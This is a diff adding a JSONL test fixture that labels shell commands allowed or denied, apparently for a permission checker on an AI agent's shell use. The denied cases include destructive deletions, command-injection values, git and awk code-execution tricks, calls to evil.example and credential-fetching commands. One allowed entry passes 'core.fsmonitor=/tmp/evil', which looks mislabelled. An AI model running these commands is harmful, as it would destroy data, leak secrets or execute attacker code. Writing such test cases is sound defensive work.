@@ -1,0 +1,311 @@
+{"allow": true, "c": "git status", "r": "git status"}
+{"allow": true, "c": "git log --oneline -5", "r": "git log"}
+{"allow": true, "c": "git log --oneline --graph -n 5", "r": "git log"}
+{"allow": true, "c": "git log --pretty=format:'%h %s' -3", "r": "git log"}
+{"allow": true, "c": "git status 2>/dev/null", "r": "git status"}
+{"allow": true, "c": "cd worktrees/origin/acme && git log -3", "r": "cd, git log"}
+{"allow": true, "c": "git -C worktrees/origin/acme diff master...HEAD", "r": "git diff"}
+{"allow": true, "c": "git -c core.fsmonitor=/tmp/evil status", "r": "git status"}
+{"allow": false, "c": "git --exec-path=/tmp/evil status", "r": null}
+{"allow": false, "c": "git push origin main", "r": null}
+{"allow": false, "c": "git add -A", "r": null}
+{"allow": false, "c": "git commit -m msg", "r": null}
+{"allow": true, "c": "git fetch origin", "r": "git fetch"}
+{"allow": false, "c": "git status; rm -rf /tmp/x", "r": null}
+{"allow": false, "c": "git status && git push", "r": null}
+{"allow": false, "c": "git log --output=/tmp/x", "r": null}
+{"allow": false, "c": "git branch -D foo", "r": null}
+{"allow": true, "c": "git branch -a", "r": "git branch"}
+{"allow": true, "c": "git branch --show-current", "r": "git branch"}
+{"allow": false, "c": "git branch foo", "r": null}
+{"allow": false, "c": "git tag v1.0", "r": null}
+{"allow": true, "c": "git tag -l 'v*'", "r": "git tag"}
+{"allow": true, "c": "git stash list", "r": "git stash list"}
+{"allow": true, "c": "git stash show -p", "r": "git stash show"}
+{"allow": false, "c": "git stash pop", "r": null}
+{"allow": true, "c": "git remote -v", "r": "git remote"}
+{"allow": false, "c": "git remote add x https://e", "r": null}
+{"allow": true, "c": "git remote show -n origin", "r": "git remote show"}
+{"allow": false, "c": "git ls-remote origin", "r": null}
+{"allow": true, "c": "git reflog show", "r": "git reflog"}
+{"allow": false, "c": "git reflog expire --all", "r": null}
+{"allow": true, "c": "git config --get user.name", "r": "git config"}
+{"allow": false, "c": "git config user.name evil", "r": null}
+{"allow": true, "c": "git check-ignore -v tailscale/logs", "r": "git check-ignore"}
+{"allow": true, "c": "grep -rohE '@[a-z0-9-]+' dir | sort | uniq -c | sort -rn", "r": "grep, sort, uniq"}
+{"allow": true, "c": "gh pr list --author @me --json number --jq '.[].number'", "r": "gh pr list"}
+{"allow": true, "c": "gh pr view 123 --json body -q .body", "r": "gh pr view"}
+{"allow": true, "c": "rg -rn 'pattern' src/", "r": "rg"}
+{"allow": true, "c": "rg -N '^description:' -m1 --no-heading .", "r": "rg"}
+{"allow": true, "c": "git fetch origin main", "r": "git fetch"}
+{"allow": true, "c": "git fetch origin --prune", "r": "git fetch"}
+{"allow": false, "c": "git fetch 'ext::sh -c id'", "r": null}
+{"allow": false, "c": "git fetch https://evil.example/repo", "r": null}
+{"allow": true, "c": "git ls-tree -r --name-only HEAD infra/", "r": "git ls-tree"}
+{"allow": true, "c": "git config user.name", "r": "git config"}
+{"allow": false, "c": "git config user.name evil", "r": null}
+{"allow": true, "c": "git config --global user.email", "r": "git config"}
+{"allow": true, "c": "git remote get-url origin", "r": "git remote get-url"}
+{"allow": false, "c": "git remote set-url origin https://evil", "r": null}
+{"allow": false, "c": "pup auth login", "r": null}
+{"allow": false, "c": "ntn pages create --parent x --content y", "r": null}
+{"allow": true, "c": "timeout 60 rg foo src/", "r": "rg"}
+{"allow": false, "c": "timeout 60 rm -rf /tmp/x", "r": null}
+{"allow": false, "c": "timeout abc rm -rf /tmp/x", "r": null}
+{"allow": false, "c": "cmd 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g'", "r": null}
+{"allow": true, "c": "ls 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g'", "r": "ls, sed read-only"}
+{"allow": false, "c": "pup api -X POST v2/tags/hosts/h -F host=h", "r": null}
+{"allow": false, "c": "pup api v2/monitors --input body.json", "r": null}
+{"allow": false, "c": "pup api-keys create --name 'x' --output json", "r": null}
+{"allow": false, "c": "pup dashboards delete abc-123", "r": null}
+{"allow": false, "c": "pup metrics submit 'my.metric:1'", "r": null}
+{"allow": false, "c": "pup monitors mute 12345", "r": null}
+{"allow": false, "c": "gws sheets spreadsheets batchUpdate --json '{}'", "r": null}
+{"allow": false, "c": "gws drive files get --params '{}' --output /tmp/f.bin", "r": null}
+{"allow": false, "c": "gws drive files create --upload photo.jpg", "r": null}
+{"allow": true, "c": "aws configservice select-resource-config --profile p --region r --expression 'SELECT resourceId' --limit 20", "r": "aws configservice select-resource-config"}
+{"allow": true, "c": "aws marketplace-agreement search-agreements --catalog AWSMarketplace --output json", "r": "aws marketplace-agreement search-agreements"}
+{"allow": true, "c": "aws cloudtrail lookup-events --max-items 5", "r": "aws cloudtrail lookup-events"}
+{"allow": false, "c": "aws secretsmanager get-secret-value --secret-id x", "r": null}
+{"allow": false, "c": "aws ecr get-login-password", "r": null}
+{"allow": false, "c": "aws sts get-session-token", "r": null}
+{"allow": false, "c": "aws eks get-token --cluster-name x", "r": null}
+{"allow": false, "c": "aws ssm get-parameter --name x --with-decryption", "r": null}
+{"allow": false, "c": "aws s3api get-object --bucket b --key k out.bin", "r": null}
+{"allow": false, "c": "aws s3api select-object-content --bucket b --key k out.json", "r": null}
+{"allow": false, "c": "aws ec2 describe-instances --endpoint-url http://evil.example", "r": null}
+{"allow": false, "c": "aws ec2 describe-instances --endpoint-url=http://evil.example", "r": null}
+{"allow": true, "c": "git log --oneline \\\n  -5", "r": "git log"}
+{"allow": false, "c": "rm -rf \\\n  /tmp/x", "r": null}
+{"allow": false, "c": "sed --in\\\n-place=x s/a/b/ f", "r": null}
+{"allow": true, "c": "python3 -m py_compile /tmp/claude/check.py", "r": "py_compile in tmp"}
+{"allow": true, "c": "python3 -m py_compile $TMPDIR/a.py $TMPDIR/b.py", "r": "py_compile in tmp"}
+{"allow": true, "c": "python3 -m py_compile \"$SCRATCHPAD/x.py\"", "r": "py_compile in tmp"}
+{"allow": false, "c": "python3 -m py_compile scripts/aws/foo.py", "r": null}
+{"allow": false, "c": "python3 -m py_compile /tmp/../etc/x.py", "r": null}
+{"allow": false, "c": "python3 -m py_compile", "r": null}
+{"allow": false, "c": "python3 -m http.server", "r": null}
+{"allow": false, "c": "python3 -c 'print(1)'", "r": null}
+{"allow": false, "c": "python3 script.py", "r": null}
+{"allow": false, "c": "PATH=/evil/bin git status", "r": null}
+{"allow": false, "c": "PATH=/evil/bin", "r": null}
+{"allow": false, "c": "RIPGREP_CONFIG_PATH=/evil/rc rg foo src/", "r": null}
+{"allow": false, "c": "GIT_SSH_COMMAND='sh -c evil' git fetch origin", "r": null}
+{"allow": false, "c": "TMPDIR=/etc python3 -m py_compile $TMPDIR/x.py", "r": null}
+{"allow": true, "c": "PYTHONDONTWRITEBYTECODE=1 python3 -m py_compile /tmp/claude/x.py", "r": "py_compile in tmp"}
+{"allow": true, "c": "LC_ALL=C sort -k2 file.txt", "r": "sort"}
+{"allow": false, "c": "export PATH=/evil/bin", "r": null}
+{"allow": false, "c": "export PATH=\"$CLAUDE_PROJECT_DIR/bin:$PATH\"", "r": null}
+{"allow": true, "c": "export AWS_PROFILE=acme-dev", "r": "export"}
+{"allow": false, "c": "FOO=bar rg foo src/", "r": null}
+{"allow": true, "c": "B=some/path", "r": "env"}
+{"allow": true, "c": "S=/private/tmp/x; cat $S/f.txt | head -3", "r": "env, cat, head"}
+{"allow": true, "c": "P=acme-prod/reader; aws --profile $P ec2 describe-instances", "r": "env, aws ec2 describe-instances"}
+{"allow": false, "c": "IFS=,", "r": null}
+{"allow": false, "c": "TMPDIR=/etc", "r": null}
+{"allow": false, "c": "rg $FLAGS pattern src/", "r": null}
+{"allow": true, "c": "rg 'end$' src/", "r": "rg"}
+{"allow": false, "c": "gh pr view $N --json title", "r": null}
+{"allow": true, "c": "cat $OUT/report.txt", "r": "cat"}
+{"allow": true, "c": "echo $HOME", "r": "echo"}
+{"allow": true, "c": "rg -n pattern src/", "r": "rg"}
+{"allow": true, "c": "rg -nA5 foo src/", "r": "rg"}
+{"allow": false, "c": "rg --pre cat foo", "r": null}
+{"allow": true, "c": "rg --files", "r": "rg"}
+{"allow": false, "c": "rg foo $(cat list)", "r": null}
+{"allow": false, "c": "rg foo `cat list`", "r": null}
+{"allow": true, "c": "rg -l foo | head -5", "r": "rg, head"}
+{"allow": true, "c": "grep -viE 'a|b' file", "r": "grep"}
+{"allow": true, "c": "grep --exclude-dir=.git -rn foo .", "r": "grep"}
+{"allow": true, "c": "echo hi > /tmp/f", "r": "echo"}
+{"allow": false, "c": "echo hi > ~/notes.txt", "r": null}
+{"allow": false, "c": "echo hi >> /etc/hosts", "r": null}
+{"allow": true, "c": "rg foo src/ > $SCRATCHPAD/hits.txt", "r": "rg"}
+{"allow": false, "c": "git status > /tmp/../etc/cron.d/x", "r": null}
+{"allow": true, "c": "echo hi", "r": "echo"}
+{"allow": true, "c": "sed -n 1,10p file.py", "r": "sed read-only"}
+{"allow": true, "c": "sed -n 's/a/b/p' file.py", "r": "sed read-only"}
+{"allow": true, "c": "sed 's/a/b/g' file.py", "r": "sed read-only"}
+{"allow": false, "c": "sed -n 's/a/b/w /tmp/x' file.py", "r": null}
+{"allow": false, "c": "sed -i 's/a/b/' file.py", "r": null}
+{"allow": false, "c": "sed '1,5e' file.py", "r": null}
+{"allow": true, "c": "sort -k2 -n file", "r": "sort"}
+{"allow": false, "c": "sort -o /tmp/x file", "r": null}
+{"allow": true, "c": "tree -L 2", "r": "tree"}
+{"allow": false, "c": "tree -o /tmp/x", "r": null}
+{"allow": true, "c": "fd -e py -d 2", "r": "fd"}
+{"allow": false, "c": "fd -x rm", "r": null}
+{"allow": true, "c": "date -u +%s", "r": "date"}
+{"allow": false, "c": "date 1231", "r": null}
+{"allow": true, "c": "ps aux", "r": "ps"}
+{"allow": false, "c": "ps auxe", "r": null}
+{"allow": true, "c": "docker ps -a", "r": "docker ps"}
+{"allow": true, "c": "docker logs --tail 50 web", "r": "docker logs"}
+{"allow": false, "c": "docker rm web", "r": null}
+{"allow": true, "c": "jq -r .name f.json", "r": "jq"}
+{"allow": false, "c": "jq 'env' f.json", "r": null}
+{"allow": false, "c": "jq -f prog.jq f.json", "r": null}
+{"allow": false, "c": "find . -name '*.py' -delete", "r": null}
+{"allow": true, "c": "find . -name '*.py'", "r": "find"}
+{"allow": true, "c": "env AWS_PROFILE=acme-dev aws ec2 describe-instances --region ap-northeast-2", "r": "aws ec2 describe-instances"}
+{"allow": false, "c": "aws s3 rm s3://bucket/key", "r": null}
+{"allow": true, "c": "aws s3 ls s3://bucket/", "r": "aws s3 ls"}
+{"allow": true, "c": "gh pr view 123 --json title", "r": "gh pr view"}
+{"allow": true, "c": "gh pr view 123 --json title --repo acme/acme", "r": "gh pr view"}
+{"allow": false, "c": "gh pr view 123 --web", "r": null}
+{"allow": false, "c": "gh pr create -t x", "r": null}
+{"allow": false, "c": "gh run watch 1", "r": null}
+{"allow": true, "c": "gh search prs --author x --limit 5", "r": "gh search prs"}
+{"allow": true, "c": "gh api repos/acme/acme/pulls/1", "r": "gh api GET"}
+{"allow": false, "c": "gh api -X POST repos/acme/acme/pulls", "r": null}
+{"allow": false, "c": "gh api repos/x -f a=b", "r": null}
+{"allow": true, "c": "terraform fmt main.tf", "r": "terraform fmt"}
+{"allow": false, "c": "terraform apply", "r": null}
+{"allow": false, "c": "acme herdr say w1:p1 hello", "r": null}
+{"allow": false, "c": "../../../bin/acme-tfe run wait run-abc", "r": null}
+{"allow": true, "c": "rtk git status", "r": "git status"}
+{"allow": false, "c": "rm -rf local/tmp", "r": null}
+{"allow": true, "c": "uv run scripts/aws/foo.py --help", "r": "uv run help"}
+{"allow": true, "c": "kubectl get pods -n books", "r": "kubectl get"}
+{"allow": false, "c": "kubectl delete pod x", "r": null}
+{"allow": true, "c": "treefmt src/acme/cli/dev.py", "r": "treefmt <paths>"}
+{"allow": false, "c": "treefmt", "r": null}
+{"allow": false, "c": "git status\nrm -rf /", "r": null}
+{"allow": false, "c": "mise trust", "r": null}
+{"allow": true, "c": "curl -s https://example.com", "r": "curl GET"}
+{"allow": false, "c": "uv run python <<'PYTHON'\nprint(1)\nPYTHON", "r": null}
+{"allow": true, "c": "cat file.txt", "r": "cat"}
+{"allow": true, "c": "sleep 5", "r": "sleep"}
+{"allow": true, "c": "herdr pane read w1:p2", "r": "herdr pane read"}
+{"allow": false, "c": "herdr pane send-keys w1:p2 Enter", "r": null}
+{"allow": false, "c": "op read op://vault/item", "r": null}
+{"allow": false, "c": "xargs rm", "r": null}
+{"allow": false, "c": "bash -c 'rm -rf /'", "r": null}
+{"allow": false, "c": "acme asana call update_tasks --args '{}'", "r": null}
+{"allow": false, "c": "acme asana call create_tasks --args '{}'", "r": null}
+{"allow": false, "c": "acme asana call add_comment --args '{}'", "r": null}
+{"allow": true, "c": "tailscale status", "r": "tailscale status"}
+{"allow": true, "c": "tailscale status --json --peers=false", "r": "tailscale status"}
+{"allow": true, "c": "tailscale status --active | rg exit-node", "r": "tailscale status, rg"}
+{"allow": false, "c": "tailscale status --web", "r": null}
+{"allow": false, "c": "tailscale status --listen 0.0.0.0:8384", "r": null}
+{"allow": false, "c": "tailscale status --browser", "r": null}
+{"allow": true, "c": "tailscale ip -4", "r": "tailscale ip"}
+{"allow": true, "c": "tailscale netcheck --format=json", "r": "tailscale netcheck"}
+{"allow": false, "c": "tailscale netcheck --every 1s", "r": null}
+{"allow": true, "c": "tailscale ping --timeout 5s node-1", "r": "tailscale ping"}
+{"allow": true, "c": "tailscale whois 100.64.0.1 --json", "r": "tailscale whois"}
+{"allow": true, "c": "tailscale version", "r": "tailscale version"}
+{"allow": true, "c": "tailscale licenses", "r": "tailscale licenses"}
+{"allow": true, "c": "tailscale status --help", "r": "tailscale help"}
+{"allow": true, "c": "tailscale dns status --all", "r": "tailscale dns status"}
+{"allow": true, "c": "tailscale dns query foo.ts.net", "r": "tailscale dns query"}
+{"allow": true, "c": "tailscale exit-node list", "r": "tailscale exit-node list"}
+{"allow": true, "c": "tailscale exit-node suggest", "r": "tailscale exit-node suggest"}
+{"allow": true, "c": "tailscale metrics print", "r": "tailscale metrics print"}
+{"allow": false, "c": "tailscale metrics write /tmp/m.prom", "r": null}
+{"allow": true, "c": "tailscale syspolicy list", "r": "tailscale syspolicy list"}
+{"allow": false, "c": "tailscale syspolicy reload", "r": null}
+{"allow": true, "c": "tailscale lock status", "r": "tailscale lock status"}
+{"allow": false, "c": "tailscale lock disable secret", "r": null}
+{"allow": false, "c": "tailscale set --exit-node=acme-exit-node", "r": null}
+{"allow": false, "c": "tailscale up --ssh", "r": null}
+{"allow": false, "c": "tailscale down", "r": null}
+{"allow": false, "c": "tailscale ssh node-1", "r": null}
+{"allow": false, "c": "tailscale file cp x.txt node-1:", "r": null}
+{"allow": false, "c": "tailscale bugreport", "r": null}
+{"allow": false, "c": "tailscale nc node-1 22", "r": null}
+{"allow": false, "c": "tailscale --socket /tmp/evil.sock status", "r": null}
+{"allow": false, "c": "tailscale", "r": null}
+{"allow": false, "c": "tailscale dns", "r": null}
+{"allow": true, "c": "terragrunt hcl validate", "r": "terragrunt hcl validate"}
+{"allow": true, "c": "terragrunt hcl validate --json --all", "r": "terragrunt hcl validate"}
+{"allow": true, "c": "terragrunt dag graph", "r": "terragrunt dag graph"}
+{"allow": false, "c": "terragrunt hcl validate --tf-path /tmp/evil", "r": null}
+{"allow": false, "c": "terragrunt hcl fmt", "r": null}
+{"allow": false, "c": "terragrunt run --all plan", "r": null}
+{"allow": false, "c": "terragrunt apply", "r": null}
+{"allow": false, "c": "terragrunt", "r": null}
+{"allow": true, "c": "whois 198.51.100.1 | rg -i netname", "r": "whois, rg"}
+{"allow": true, "c": "dig +short example.com", "r": "dig"}
+{"allow": true, "c": "dig @8.8.8.8 example.com A", "r": "dig"}
+{"allow": true, "c": "host example.com", "r": "host"}
+{"allow": true, "c": "nslookup mcp-proxy.anthropic.com", "r": "nslookup"}
+{"allow": false, "c": "nslookup", "r": null}
+{"allow": false, "c": "granted sso list", "r": null}
+{"allow": false, "c": "granted sso-tokens list", "r": null}
+{"allow": false, "c": "granted credential-process acme-restore/admin", "r": null}
+{"allow": false, "c": "cat <<'PY' | uv run python -\nprint(1)\nPY", "r": null}
+{"allow": false, "c": "cat <<'EOF' | bash\nrm -rf /\nEOF", "r": null}
+{"allow": true, "c": "ls -1 /d/ 2>&1 | grep -iE 'a|b' | grep -i x\nls -1 '/e/' 2>&1 | grep -i x", "r": "ls, grep"}
+{"allow": false, "c": "git log --oneline | head -25\nterraform apply -auto-approve", "r": null}
+{"allow": true, "c": "rg -n '\\$\\(' src/", "r": "rg"}
+{"allow": true, "c": "grep -n '^<<<<<<<\\|^=======' infra/main.tf", "r": "grep"}
+{"allow": true, "c": "(cd sub && ls)", "r": "cd, ls"}
+{"allow": false, "c": "ls & rm -rf /tmp/a", "r": null}
+{"allow": false, "c": "if rm -rf /tmp/z; then echo ok; fi", "r": null}
+{"allow": true, "c": "for f in a b c; do cat $f; done", "r": "cat"}
+{"allow": false, "c": "for f in $(ls); do rm $f; done", "r": null}
+{"allow": false, "c": "greet() { rm -rf /; }; greet", "r": null}
+{"allow": false, "c": "cat f > out.txt", "r": null}
+{"allow": false, "c": "ls | tee /etc/x", "r": null}
+{"allow": false, "c": "echo hi > /etc/passwd", "r": null}
+{"allow": true, "c": "cd \"$(git rev-parse --show-toplevel)\" && git status --short", "r": "git rev-parse, cd, git status"}
+{"allow": true, "c": "ls $(git rev-parse --show-toplevel)", "r": "git rev-parse, ls"}
+{"allow": true, "c": "echo `whoami`", "r": "whoami, echo"}
+{"allow": true, "c": "diff <(sort a) <(sort b)", "r": "sort, diff"}
+{"allow": false, "c": "diff <(sort a) <(rm -rf b)", "r": null}
+{"allow": false, "c": "echo $(rm -rf /tmp/x)", "r": null}
+{"allow": false, "c": "rg foo \"$(git rev-parse HEAD)\"", "r": null}
+{"allow": false, "c": "$(echo rg) foo", "r": null}
+{"allow": false, "c": "x=$(rm -rf /tmp/q); echo $x", "r": null}
+{"allow": false, "c": "cat f > >(rm -rf /tmp/x)", "r": null}
+{"allow": false, "c": "eval \"rm -rf /\"", "r": null}
+{"allow": true, "c": "D=/x; rg -n pat $D/src", "r": "env, rg"}
+{"allow": true, "c": "F=/tmp/x.jsonl; cat $F && rg -n foo $F", "r": "env, cat, rg"}
+{"allow": true, "c": "D=/Users/x/repo; git -C $D log --oneline -3", "r": "env, git log"}
+{"allow": true, "c": "cd $HOME/src && git status", "r": "cd, git status"}
+{"allow": true, "c": "set -euo pipefail", "r": "set"}
+{"allow": true, "c": "command -v rtk", "r": "command"}
+{"allow": true, "c": "while read -r f; do cat $f; done < list.txt", "r": "read, cat"}
+{"allow": true, "c": "cat files.txt | xargs wc -l", "r": "cat, xargs wc"}
+{"allow": true, "c": "awk -F, '{print $1}' data.csv", "r": "awk read-only"}
+{"allow": true, "c": "awk '$3 >= 100 {print $1}' f", "r": "awk read-only"}
+{"allow": true, "c": "curl -s -m 15 https://api.github.com/repos/acme", "r": "curl GET"}
+{"allow": true, "c": "curl -s -o /tmp/claude/out.json https://api.github.com/x", "r": "curl GET"}
+{"allow": true, "c": "git log --show-signature -1", "r": "git log"}
+{"allow": true, "c": "kubectl --context prod get pods", "r": "kubectl get"}
+{"allow": true, "c": "terraform init -backend=false", "r": "terraform init -backend=false"}
+{"allow": true, "c": "direnv exec . env", "r": "env"}
+{"allow": true, "c": "export MISE_TRUSTED_CONFIG_PATHS=/x/y", "r": "export"}
+{"allow": true, "c": "herdr api schema", "r": "herdr api schema"}
+{"allow": false, "c": "F=$(latest); rg -n foo $F", "r": null}
+{"allow": false, "c": "F='/x y'; rg -n foo $F", "r": null}
+{"allow": false, "c": "if true; then D=/x; fi; rg -n pat $D", "r": null}
+{"allow": false, "c": "D=/x rg -n pat $D/src", "r": null}
+{"allow": false, "c": "F=/tmp/a; read F; rg -n foo $F", "r": null}
+{"allow": false, "c": "F=/tmp/a; unset F; rg -n foo $F", "r": null}
+{"allow": false, "c": "F=/tmp/a; F=$(x); rg -n foo $F", "r": null}
+{"allow": false, "c": "D=/x; gomi $D/file", "r": null}
+{"allow": false, "c": "read IFS", "r": null}
+{"allow": false, "c": "ls | xargs rg -n foo", "r": null}
+{"allow": false, "c": "ls | xargs gomi", "r": null}
+{"allow": false, "c": "awk '{system(\"id\")}' f", "r": null}
+{"allow": false, "c": "awk '$3 > 100' f", "r": null}
+{"allow": false, "c": "awk -f prog.awk data", "r": null}
+{"allow": false, "c": "awk '{print $0 | \"sh\"}' f", "r": null}
+{"allow": false, "c": "curl -s -o /etc/passwd https://x", "r": null}
+{"allow": false, "c": "curl -s -X POST https://x", "r": null}
+{"allow": false, "c": "curl -d x=1 https://x", "r": null}
+{"allow": false, "c": "curl -T file https://x", "r": null}
+{"allow": false, "c": "export PATH=/evil", "r": null}
+{"allow": false, "c": "export GIT_DIR=/x/.git", "r": null}
+{"allow": false, "c": "terraform init", "r": null}
+{"allow": false, "c": "terraform init -backend=false -upgrade", "r": null}
+{"allow": false, "c": "uv run q.py x", "r": null}
+{"allow": false, "c": "uv run python -c 'print(1)'", "r": null}
+{"allow": false, "c": "direnv exec $DIR env", "r": null}
+{"allow": false, "c": "kubectl --context prod delete pod x", "r": null}
+{"allow": true, "c": "git -c core.pager=cat log --oneline -2", "r": "git log"}
+{"allow": true, "c": "git -ccore.pager=cat status -sb", "r": "git status"}
+{"allow": false, "c": "git -c core.pager=cat push origin main", "r": null}
